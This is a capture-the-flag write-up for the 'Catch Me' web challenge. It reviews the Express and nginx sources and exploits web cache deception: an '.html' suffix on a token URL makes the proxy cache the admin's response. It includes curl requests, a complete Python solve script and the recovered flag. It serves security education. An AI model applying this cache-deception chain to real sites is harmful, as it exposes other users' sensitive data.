
# Catch Me

 * Category: Web
 * Solved by the JCTF Team

## Description

> Tell Cersei. I want her to know it was me.

The sources and configuration for a web application were attached.

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/catch_me]
└─$ tree catch-me
catch-me
├── backend
│   ├── Dockerfile
│   ├── config.js
│   ├── controllers
│   │   ├── authController.js
│   │   └── userController.js
│   ├── index.js
│   ├── middleware
│   │   └── authMiddleware.js
│   ├── package-lock.json
│   ├── package.json
│   ├── public
│   │   └── styles
│   │       ├── dashboard.css
│   │       └── login.css
│   ├── routes
│   │   └── router.js
│   └── views
│       ├── dashboard.ejs
│       └── login.ejs
├── docker-compose.yml
└── frontend
    ├── Dockerfile
    └── nginx.conf

9 directories, 16 files
```

## Solution

Visiting the web application, we are requested to sign in user a username and password.  
It's not possible to register, but in the sources we find `guest` credentials:

```javascript
// From userController.js:

const processLogin = async (req, res) => {
    const {username, password} = req.body;
    if (username === 'guest' && password === 'guest') {
        if (!req.session?.domain) {
            const subdomain = process.env.CHALLENGE_SUBDOMAIN || crypto.randomBytes(6).toString("hex");
            req.session.domain = `${subdomain}.${CHALLENGE_DOMAIN}`;
        }
    } else if (!(username === 'admin' && password === ADMIN_PASSWORD)) {
        return res.status(401).send('Invalid credentials!');
    }

    req.session.user = username;
    await req.session.save();

    return res.send('Success');
};
```


The attached web application offers two main features in its dashboard after signing in.

First, it allows creating and viewing a token:

```javascript
// From router.js:

router.post(
    '/api/token',
    validateAccess,
    isLoggedIn,
    authController.generateServiceToken
);

router.get(
    '/api/token/:tokenId',
    validateAccess,
    isLoggedIn,
    authController.getTokenById
);

// From authController.js:

const generateServiceToken = async (req, res) => {
    const token = uuidv4();
    let tokens = req.session.tokens || [];
    tokens.push(token);
    req.session.tokens = tokens;
    req.session.save();

    return res.json({
        message: 'New service token generated successfully!',
        tokenId: tokens.length - 1,
        token
    });
};

const getTokenById = (req, res) => {
    if (req.session?.user === 'admin') {
        return res.json({token: FLAG});
    }

    const id = parseInt(req.params.tokenId, 10);
    let token = req.session.tokens[id];
    if (!token) {
        return res.status(404).json({error: `Token with ID ${id} not found.`});
    }

    return res.json({token});
};
```

In addition, it allows reporting a URL to the admin:

```javascript
// From router.js:

router.post(
    '/api/report',
    validateAccess,
    isLoggedIn,
    async (req, res) => {
        const { url } = req.body;
        const username = "admin";
        const password = ADMIN_PASSWORD;

        let parsedUrl;
        try {
            parsedUrl = new URL(url);
        } catch {
            return res.status(400).json({ error: 'Invalid URL.' });
        }

        if (parsedUrl.hostname !== req.session.domain) {
            return res.status(403).json({
                error: `URL must target your own subdomain (${req.session.domain}).`
            });
        }

        try {
            // 5d) Create a cookie‐aware Axios instance:
            const jar = new CookieJar();
            const client = wrapper(
                axios.create({
                    jar,
                    withCredentials: true,
                    // Optionally set a timeout, headers, etc.
                    timeout: 5000
                })
            );

            const loginEndpoint = `${parsedUrl.origin}/login`;
            await client.post(
                loginEndpoint,
                JSON.stringify({ username, password }),
                {
                    headers: {
                        'Content-Type': 'application/json'
                    }
                }
            );

            await client.get(url);

            res.json({ success: true, message: 'Request triggered successfully.' });
        } catch (error) {
            console.error('Request error:', error);
            // Distinguish between a login failure vs. GET failure if you want more granularity:
            return res.status(500).json({ error: 'Error triggering request.' });
        }
    }
);
```

From the sources above, we learn that:

 * It's possible to generate a token using `/api/token`. The token is just a UUID.
   It is saved in an array in the user's session.
 * It's possible to view the details of the token using `/api/token/:tokenId`.
   If the admin is viewing the token, the flag will be returned. Otherwise, the original UUID.
 * When we report a URL, the admin visits it.

Adding these points together, it sounds like we want to generate a token and then
get the admin to visit it. However, the contents of the URL as viewed by the admin
isn't returned to us. So how do we leak the flag?

The answer lies within the frontend `nginx` configuration:

```
proxy_cache_path /var/cache/nginx keys_zone=my_cache:10m levels=1:2 inactive=60m;

server {
    listen 80;
    listen [::]:80;

    server_name _;
    resolver ${DNS_SERVER} valid=5s;

    location ~* \.(css|js|html)$ {
        proxy_cache my_cache;
        proxy_set_header Host $host;
        add_header X-Cache-Status $upstream_cache_status;
        proxy_ignore_headers Set-Cookie Cache-Control Expires;
        proxy_cache_valid any 10m;
        proxy_cache_key "$scheme://$host$request_uri";

        proxy_pass http://${CHALLENGE_BACKEND}:3000;
    }

    location / {
        proxy_set_header Host $host;
        proxy_pass http://${CHALLENGE_BACKEND}:3000;
    }
}

```

The server caches requests! So, if we can somehow execute a *Cache Poisoning* attack,
we might be able to get the server to serve us the details for a token which were 
cached when originally viewed by the admin.

Let's start.

We login:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/catch_me]
└─$ curl 'https://www.catch-me.appsecil.ctf.today/login' \
  -X POST \
  -H 'Content-Type: application/json' \
  --cookie cookie.txt --cookie-jar cookie.txt -s -L \
  --data-raw '{"username":"guest","password":"guest"}'
Success
```

The implementation redirects us upon access to a dedicated subdomain, let's get it:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/catch_me]
└─$ curl 'https://www.catch-me.appsecil.ctf.today/' --cookie cookie.txt --cookie-jar cookie.txt -I -L -s | grep location
location: /dashboard
location: https://3c400d4b29f3.catch-me.appsecil.ctf.today/dashboard
```

We create a token:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/catch_me]
└─$ curl 'https://3c400d4b29f3.catch-me.appsecil.ctf.today/api/token' \
  -X POST \
  -H 'Content-Type: application/json' \
  --cookie cookie.txt --cookie-jar cookie.txt -s
{"message":"New service token generated successfully!","tokenId":0,"token":"f50b6c42-fab4-40e0-9656-06016eb70cd3"}  
```

Report it:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/catch_me]
└─$ curl 'https://3c400d4b29f3.catch-me.appsecil.ctf.today/api/report' \
  -X POST \
  -H 'Content-Type: application/json' \
  --cookie cookie.txt --cookie-jar cookie.txt -s \
  --data-raw '{"url":"https://3c400d4b29f3.catch-me.appsecil.ctf.today/api/token/0"}'
{"success":true,"message":"Request triggered successfully."} 
```

And view it:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/catch_me]
└─$ curl 'https://3c400d4b29f3.catch-me.appsecil.ctf.today/api/token/0' \
  --cookie cookie.txt --cookie-jar cookie.txt -s
{"token":"f50b6c42-fab4-40e0-9656-06016eb70cd3"}
```

But why aren't we getting the flag? If we take a closer look at the nginx configuration,
we'll see that it only caches JS/CSS/HTML pages, but we're trying to cache a URL that isn't
any of the above!  
What can we do? In Express.js, route parameters (like `:tokenId`) are greedy by default - they 
match anything that doesn't include a slash. So, simply adding an ".html" suffix is enough in this
case.

The following script will automate the process:

```python
import requests
import time
import re
from urllib.parse import urljoin

BASE_DOMAIN = 'catch-me.appsecil.ctf.today'
BASE_URL = "https://www." + BASE_DOMAIN

session = requests.Session()

def login():
    print('[*] Logging in as guest...')
    r = session.post(urljoin(BASE_URL, '/login'), json={'username': 'guest', 'password': 'guest'})
    if r.ok:
        print('[+] Login successful.')
    else:
        print('[-] Login failed!')
        exit(1)

def get_subdomain():
    print('[*] Discovering redirected subdomain...')
    r = session.get(BASE_URL, allow_redirects=True)
    match = re.search(r'https://([a-z0-9]+)\.' + re.escape(BASE_DOMAIN), r.url)
    if not match:
        print('[-] Failed to extract subdomain.')
        exit(1)
    sub = match.group(1)
    print(f'[+] Subdomain: {sub}')
    return f'https://{sub}.{BASE_DOMAIN}'

def generate_token(subdomain):
    print('[*] Creating new token...')
    r = session.post(urljoin(subdomain, '/api/token'))
    data = r.json()
    token_id = data['tokenId']
    print(f'[+] Token ID: {token_id}')
    return token_id

def report_url(subdomain, token_id):
    report_url = f'{subdomain}/api/token/{token_id}.html'
    print(f'[*] Reporting URL to admin: {report_url}')
    r = session.post(
        urljoin(subdomain, '/api/report'),
        json={'url': report_url}
    )
    if r.ok and r.json().get('success'):
        print('[+] Admin visit triggered.')
    else:
        print('[-] Report failed:', r.text)
        exit(1)

def try_fetch_token(subdomain, token_id):
    print('[*] Trying to fetch cached token response...')
    target_url = f'{subdomain}/api/token/{token_id}.html'
    headers = {
        'Accept': 'application/json, text/plain, */*',
    }
    r = session.get(target_url, headers=headers)
    print('[+] Response:')
    print(r.text)

def main():
    login()
    subdomain = get_subdomain()
    token_id = generate_token(subdomain)
    report_url(subdomain, token_id)
    try_fetch_token(subdomain, token_id)

if __name__ == '__main__':
    main()
```

Output: 

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/catch_me]
└─$ python3 solve.py
[*] Logging in as guest...
[+] Login successful.
[*] Discovering redirected subdomain...
[+] Subdomain: 85e73e5a1a05
[*] Creating new token...
[+] Token ID: 0
[*] Reporting URL to admin: https://85e73e5a1a05.catch-me.appsecil.ctf.today/api/token/0.html
[+] Admin visit triggered.
[*] Trying to fetch cached token response...
[+] Response:
{"token":"AppSec-IL{C4aching_1s_4w3s0m3}"}
```